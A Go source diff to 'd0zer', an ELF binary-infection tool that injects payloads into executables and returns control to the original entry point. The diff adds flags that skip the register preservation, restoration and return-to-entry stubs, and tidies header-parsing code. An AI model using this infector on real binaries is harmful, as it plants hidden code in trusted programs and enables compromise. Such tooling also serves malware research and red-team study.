@@ -180,7 +180,7 @@ func checkError(e error) {
 	}
 }
 
-func (t *targetBin) infectBinary(debug bool) error {
+func (t *targetBin) infectBinary(debug bool, noRestoration bool, noRetOEP bool) error {
 	var textSegEnd interface{}
 	var oShoff interface{}
 	var textNdx int
@@ -208,10 +208,15 @@ func (t *targetBin) infectBinary(debug bool) error {
 					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
 					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 				}
+				
+				if noRestoration  == false {
+					t.Payload.Write(restoration64)
+				}
 
-				t.Payload.Write(restoration64)
-				retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
-				t.Payload.Write(retStub)
+				if noRetOEP == false {
+					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
+					t.Payload.Write(retStub)
+				}
 
 				if debug {
 					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
@@ -284,9 +289,14 @@ func (t *targetBin) infectBinary(debug bool) error {
 					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 				}
 
-				t.Payload.Write(restoration32)
-				retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
-				t.Payload.Write(retStub)
+				if noRestoration == false {
+					t.Payload.Write(restoration32)
+				}
+
+				if noRetOEP == false {
+					retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
+					t.Payload.Write(retStub)
+				}
 
 				if debug {
 					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
@@ -410,6 +420,15 @@ func (t *targetBin) infectBinary(debug bool) error {
 	return nil
 }
 
+func (t *targetBin) writePreservationStub() {
+	switch t.EIdent.Arch {
+	case elf.ELFCLASS64:
+		t.Payload.Write(preserve64)
+	case elf.ELFCLASS32:
+		t.Payload.Write(preserve32)
+	}
+}
+
 func (t *targetBin) enumIdent() error {
 	switch elf.Class(t.Ident[elf.EI_CLASS]) {
 	case elf.ELFCLASS64:
@@ -456,7 +475,7 @@ func (t *targetBin) mapHeader() error {
 func (t *targetBin) getSectionHeaders() error {
 	if h, ok := t.Hdr.(*elf.Header64); ok {
 		start := int(h.Shoff)
-		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
+		end := int(h.Shentsize) * int(h.Shnum) + int(h.Shoff)
 		sr := bytes.NewBuffer(t.Contents[start:end])
 		t.Shdrs = make([]elf.Section64, h.Shnum)
 
@@ -467,7 +486,7 @@ func (t *targetBin) getSectionHeaders() error {
 
 	if h, ok := t.Hdr.(*elf.Header32); ok {
 		start := int(h.Shoff)
-		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
+		end := int(h.Shentsize) * int(h.Shnum) + int(h.Shoff)
 		sr := bytes.NewBuffer(t.Contents[start:end])
 		t.Shdrs = make([]elf.Section32, h.Shnum)
 
@@ -482,7 +501,7 @@ func (t *targetBin) getSectionHeaders() error {
 func (t *targetBin) getProgramHeaders() error {
 	if h, ok := t.Hdr.(*elf.Header64); ok {
 		start := h.Phoff
-		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
+		end := int(h.Phentsize) * int(h.Phnum) + int(h.Phoff)
 		pr := bytes.NewBuffer(t.Contents[start:end])
 		t.Phdrs = make([]elf.Prog64, h.Phnum)
 
@@ -493,7 +512,7 @@ func (t *targetBin) getProgramHeaders() error {
 
 	if h, ok := t.Hdr.(*elf.Header32); ok {
 		start := h.Phoff
-		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
+		end := int(h.Phentsize) * int(h.Phnum) + int(h.Phoff)
 		pr := bytes.NewBuffer(t.Contents[start:end])
 		t.Phdrs = make([]elf.Prog32, h.Phnum)
 
@@ -526,6 +545,9 @@ func main() {
 	pEnv := flag.String("payloadEnv", "", "name of the environmental variable holding the payload")
 	oFile := flag.String("target", "", "path to binary targetted for infection")
 	pFile := flag.String("payloadBin", "", "path to binary containing payload")
+	noPres := flag.Bool("noPreserve", false, "prevents d0zer from prepending its register preservation routine to your payload")
+	noRest := flag.Bool("noRestoration", false, "prevents d0zer from appending register restoration routine to your payload")
+	noRetOEP := flag.Bool("noRetOEP", false, "prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload")
 	flag.Parse()
 
 	if *oFile == "" {
@@ -557,11 +579,8 @@ func main() {
 		return
 	}
 
-	switch t.EIdent.Arch {
-	case elf.ELFCLASS64:
-		t.Payload.Write(preserve64)
-	case elf.ELFCLASS32:
-		t.Payload.Write(preserve32)
+	if  *noPres == false {
+		t.writePreservationStub()
 	}
 
 	switch {
@@ -603,7 +622,7 @@ func main() {
 		return
 	}
 
-	if err := t.infectBinary(*debug); err != nil {
+	if err := t.infectBinary(*debug, *noRest, *noRetOEP); err != nil {
 		fmt.Println(err)
 		return
 	}
